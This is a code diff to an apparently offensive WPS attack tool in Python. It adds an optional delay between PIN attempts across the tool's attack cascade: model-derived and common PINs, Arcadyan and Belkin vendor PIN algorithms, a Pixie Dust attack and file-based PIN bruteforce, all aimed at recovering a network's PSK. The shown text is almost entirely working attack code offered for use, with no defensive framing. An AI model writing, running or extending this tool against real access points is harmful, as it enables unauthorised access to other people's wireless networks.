@@ -1397,17 +1397,19 @@ def generate_pins(mac=None, ssid=None, serial=None):
     return _order_unique_pins(pins)
 
 
-def try_pin_sequence(comp, bssid, pins, pixie=False):
+def try_pin_sequence(comp, bssid, pins, pixie=False, delay=None):
     for pin in pins:
         if pin in TRIED_PINS:
             continue
         TRIED_PINS.add(pin)
         if comp.single_connection(bssid, pin, pixiemode=pixie):
             return True
+        if delay:
+            time.sleep(delay)
     return False
 
 
-def try_bruteforce_file(comp, bssid, path):
+def try_bruteforce_file(comp, bssid, path, delay=None):
     for p in [path, os.path.join(os.path.dirname(__file__), path)]:
         try:
             with open(p, 'r') as f:
@@ -1418,6 +1420,8 @@ def try_bruteforce_file(comp, bssid, path):
                     TRIED_PINS.add(pin)
                     if comp.single_connection(bssid, pin):
                         return True
+                    if delay:
+                        time.sleep(delay)
             return False
         except Exception as e:
             last = e
@@ -1483,20 +1487,20 @@ if __name__ == '__main__':
                 else:
                     model = network.get('Model', '') + network.get('Model number', '') if network else ''
                     device = network.get('Device name', '') if network else ''
-                    if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device)):
+                    if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device), delay=args.delay):
                         if args.pixie_dust:
                             print('[*] Trying Pixie Dust attack...')
                             companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
                         if companion.connection_status.status != 'GOT_PSK':
-                            if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid)):
-                                if not try_pin_sequence(companion, args.bssid, COMMON_PINS):
+                            if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid), delay=args.delay):
+                                if not try_pin_sequence(companion, args.bssid, COMMON_PINS, delay=args.delay):
                                     pins = generate_pins(mac=args.bssid, ssid=essid)
-                                    if not try_pin_sequence(companion, args.bssid, pins):
-                                        if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p]):
-                                            if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p]):
+                                    if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
+                                        if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
+                                            if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
                                                 if isinstance(args.bruteforce_pins, str):
                                                     print('[*] Trying PINs from file...')
-                                                    if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
+                                                    if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins, delay=args.delay):
                                                         print('[-] All PIN attempts failed.')
                                                 elif args.bruteforce_pins is True:
                                                     companion.smart_bruteforce(args.bssid, args.pin, args.delay)
